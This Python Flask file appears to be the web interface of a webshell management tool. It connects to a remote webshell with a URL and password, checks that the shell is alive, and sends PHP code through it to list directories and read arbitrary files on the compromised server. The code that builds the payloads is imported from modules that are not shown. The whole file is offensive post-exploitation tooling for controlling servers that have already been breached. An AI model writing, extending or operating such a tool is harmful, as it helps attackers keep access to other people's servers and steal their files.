#!/usr/bin/python3
# -*- coding:utf-8 -*-
# Author: Imtinmin
# @Time: 2019/5/17 0:12

from flask import Flask,render_template,url_for,jsonify,request,redirect,session

from apps import app,forms,models
from apps.models import gethistory
from apps.forms import LinkForm#,csrf
from apps.unitis.tools import SendCode
from apps.unitis.PHPcode import getfiledir,getfilelist,getFilePathBase,test
#csrf.init_app(app)
@app.route('/')
def index():
	form = LinkForm()
	return render_template('home.html',form=form)

@app.route('/api/login')
def shellapi():
	if request.method == 'GET':
		url = request.args.get('url')
		pwd = request.args.get('pwd')
		if SendCode(url,pwd,test()).checkshell():
			response = jsonify({'code':200,'msg':'success','url':url,'pwd':pwd})
			response.set_cookie('webshellurl',url)
			response.set_cookie('pwd',pwd)
			return response
		else:
			response = jsonify({'code':404,'msg':'error','url':url,'pwd':pwd})
			return response

@app.route('/login',methods=['POST'])
def shell():
	if request.method == 'POST':
		form = LinkForm()
		url = request.form.get('url')
		pwd = request.form.get('pwd')
		if SendCode(url,pwd,test()).checkshell():
			#return response
			session['url'] = url
			session['pwd'] = pwd
			return redirect('/board')
			
		else:
			response = jsonify({'code':404,'msg':'error','url':url,'pwd':pwd})
			return response



@app.route('/board')
def board():
	if  'url' in session and 'pwd' in session:
		url = session.get('url')
		pwd = session.get('pwd')
		if 'localdir' in session:	
			localdir = session.get('localdir') #session获取当前路径
		else:
			localdir = SendCode(url,pwd,getfiledir()).getFilePathres().split('/') #['', 'var', 'www', 'html', 'upload ']
			session['localdir'] = localdir	#将当前路径存入session
	#print(localdir)
		FileList = SendCode(url,pwd,getFilePathBase('./')).getFilelist() #文件列表
		file_list = [x for x in FileList if x['filename'] not in ['.', '..']]
		return render_template('board.html',localdir=localdir,FileList= file_list)
	else:
		return redirect('/')

@app.route('/manager')
def manager():
	history = gethistory()
	return render_template('manager.html',history = history)


@app.route('/api/fileList')
def fileList():
	url = request.args.get('url')
	pwd = request.args.get('pwd')
	FileList = SendCode(url,pwd,getFilePathBase('./')).getFilelist()
	return str(FileList)

@app.route('/api/scandir')#/api/scandir?dir=/var/www/html
def scandirs():
	from apps.unitis.PHPcode import scandir
	thisdir = "./"
	if request.args.get('dir'):
		thisdir = request.args.get('dir')
	if  'url' in session and 'pwd' in session:
		url = session.get('url')
		pwd = session.get('pwd')
	filelist = SendCode(url,pwd,scandir("{}".format(thisdir))).getFileListres()
	return jsonify(filelist)



@app.route('/api/readfile')
def readfile():
	from apps.unitis.PHPcode import catfile
	thisfile = "__file__"
	if request.args.get('filename'):
		thisfile = request.args.get('filename')
	if  'url' in session and 'pwd' in session:
		url = session.get('url')
		pwd = session.get('pwd')
	content = SendCode(url,pwd,catfile("{}".format(thisfile))).getfilecontent()
	return content

